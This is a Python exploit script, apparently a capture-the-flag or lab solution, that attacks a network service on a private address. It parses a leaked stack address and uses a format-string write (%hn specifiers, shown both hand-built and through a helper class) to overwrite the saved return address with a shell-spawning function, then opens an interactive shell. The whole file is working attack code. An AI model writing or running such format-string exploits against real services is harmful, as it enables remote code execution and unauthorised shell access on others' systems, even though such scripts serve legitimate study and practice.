#!/usr/bin/env python
from sc_pwn import *

target     = {'host':'192.168.75.139','port':8080}

offset_stack_ret    = 0x50
addr_get_shell      = 0x080485e5

#==========
def attack(cmn):
    cmn.read_until('(')
    addr_stack_buf = int(cmn.read_until(')', contain=False), 16)
    addr_stack_ret = addr_stack_buf + offset_stack_ret
    info('addr_stack_ret    = 0x%08x' % addr_stack_ret)
    
    """    
    exploit  = pack_32(addr_stack_ret+2)
    exploit += pack_32(addr_stack_ret)
    exploit += '%'+str(0x0804-8)+'c' 
    exploit += '%7$hn'
    exploit += '%'+str(0x85e5-0x0804)+'c' 
    exploit += '%8$hn' 

    cmn.sendln(exploit)
    """
    fsb = FSB(size=2)
    fsb.set_adrval(addr_stack_ret, addr_get_shell)
    fsb.auto_write(index=7)

    cmn.sendln(fsb.get())

#==========

if __name__=='__main__':
    cmn = Communicate(target,mode='SOCKET')
    attack(cmn)
    
    sh = Shell(cmn)
    sh.select()
    del(sh)
    
    del(cmn)
    
#==========
